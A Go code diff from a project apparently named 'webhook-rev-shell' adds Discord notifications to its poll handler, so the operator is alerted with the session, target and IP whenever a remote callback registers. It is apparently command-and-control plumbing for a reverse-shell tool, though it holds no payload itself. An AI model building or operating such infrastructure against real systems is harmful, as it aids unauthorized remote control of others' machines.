@@ -4,19 +4,23 @@ import (
 	"encoding/json"
 	"errors"
 	"io"
+	"log"
+	"net"
 	"net/http"
 	"time"
 
 	"github.com/go-chi/chi/v5"
 	"github.com/google/uuid"
 	"github.com/noahmagill/webhook-rev-shell/internal/broker"
+	"github.com/noahmagill/webhook-rev-shell/internal/notify"
 	"github.com/noahmagill/webhook-rev-shell/internal/protocol"
 )
 
 const pollTimeout = 30 * time.Second
 
 type PollHandler struct {
-	B *broker.Broker
+	B       *broker.Broker
+	Discord *notify.Discord
 }
 
 func (h *PollHandler) Register(w http.ResponseWriter, r *http.Request) {
@@ -65,6 +69,15 @@ func (h *PollHandler) Register(w http.ResponseWriter, r *http.Request) {
 		}
 		http.Error(w, "internal error", http.StatusInternalServerError)
 		return
+	}
+
+	if h.Discord != nil && h.Discord.Enabled() {
+		callbackIP := requestIP(r)
+		go func() {
+			if err := h.Discord.CallbackConnected(sess, target, callbackIP); err != nil {
+				log.Printf("discord callback notify: %v", err)
+			}
+		}()
 	}
 
 	w.Header().Set("Content-Type", "application/json")
@@ -196,4 +209,15 @@ func (h *PollHandler) Event(w http.ResponseWriter, r *http.Request) {
 
 	w.WriteHeader(http.StatusOK)
 	w.Write([]byte(`{"status":"ok"}`))
+}
+
+func requestIP(r *http.Request) string {
+	if r == nil {
+		return ""
+	}
+	host, _, err := net.SplitHostPort(r.RemoteAddr)
+	if err == nil {
+		return host
+	}
+	return r.RemoteAddr
 }
